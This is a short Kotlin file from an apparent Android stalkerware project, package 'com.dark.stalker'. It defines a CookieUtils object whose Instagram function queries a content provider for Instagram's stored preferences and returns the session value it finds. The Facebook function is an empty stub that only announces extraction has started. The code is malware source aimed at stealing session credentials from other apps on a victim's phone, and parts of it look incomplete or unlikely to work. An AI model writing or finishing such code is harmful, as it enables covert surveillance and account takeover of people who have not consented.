package com.dark.stalker

import android.content.Context
import android.database.Cursor
import android.net.Uri

object CookieUtils {
    fun getInstagramCookies(context: Context): String {
        try {
            val cursor: Cursor? = context.contentResolver.query(
                Uri.parse("content://com.instagram.sharedprefs.SharedPrefsProvider/Instagram/shared_prefs"),
                null, null, null, null
            )
            if (cursor != null && cursor.moveToFirst()) {
                return "IG Session Found: ${cursor.getString(cursor.getColumnIndexOrThrow("value"))}"
            }
        } catch (e: Exception) {
            return "IG Cookies Failed: ${e.message}"
        }
        return "No IG Cookies"
    }

    fun getFacebookCookies(context: Context): String {
        return "FB Cookies Extraction Initiated..."
    }
}
